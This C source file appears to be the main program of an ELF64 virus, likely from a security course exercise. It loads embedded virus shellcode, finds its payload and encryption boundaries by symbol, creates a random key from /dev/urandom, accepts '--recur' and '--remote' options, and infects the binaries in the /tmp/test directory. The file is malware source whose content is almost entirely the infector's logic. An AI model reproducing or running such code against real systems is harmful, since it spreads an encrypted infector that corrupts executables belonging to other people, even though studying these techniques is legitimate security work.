#include "lib/lib.h"
#include "lib/infect.h"
#include "virus_shellcode.h"

int usage(char *name){
	print("usage: ./");
	print(name);
	print(" binary\n\nnote: the binary must be in elf64\n");
	return -1;
}

int randomize(char *k){
	int             fd;

	if ((fd = open("/dev/urandom", 0, 0)) == -1)
		return FALSE;
	read(fd, (char *)k, sizeof(*k)*16);
	return TRUE;
}

int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
	long long bin_start_off;
	long long bin_end_off;

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
	(*v) = virus_shellcode + bin_start_off;
	(*l) = bin_end_off - bin_start_off; 

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", c_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", c_len);
	(*c_len) = (*c_len)-(*c_off);
	(*c_off) -= bin_start_off; 

	return TRUE;
}

int main(int ac, char **av){
	(void)ac;
	(void)av;

	char *virus;
	size_t virus_len;
	size_t crypt_off;
	size_t crypt_len;
	struct s_opt opt = {0,0};
	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
		return 1;
	randomize(KEY);

	for (int i = 1; i < ac; i ++){
		if (str_equal(av[i], "--recur"))
			opt.is_recur = TRUE;
		if (str_equal(av[i], "--remote"))
			opt.is_remote = TRUE;
	}
	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
	//infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
	return 0;
}
